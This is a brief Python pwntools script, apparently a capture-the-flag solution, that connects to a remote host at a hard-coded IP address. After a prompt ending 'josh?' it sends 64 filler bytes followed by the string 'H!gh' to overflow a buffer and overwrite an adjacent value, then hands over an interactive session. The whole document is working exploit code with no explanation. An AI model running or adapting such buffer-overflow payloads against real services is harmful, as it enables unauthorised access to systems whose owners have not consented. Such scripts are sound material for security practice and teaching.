from pwn import *

r = remote("104.154.106.182",1234)

payload = "A"*0x40

payload += "H!gh"

r.sendlineafter("josh?\n", payload)

r.interactive()
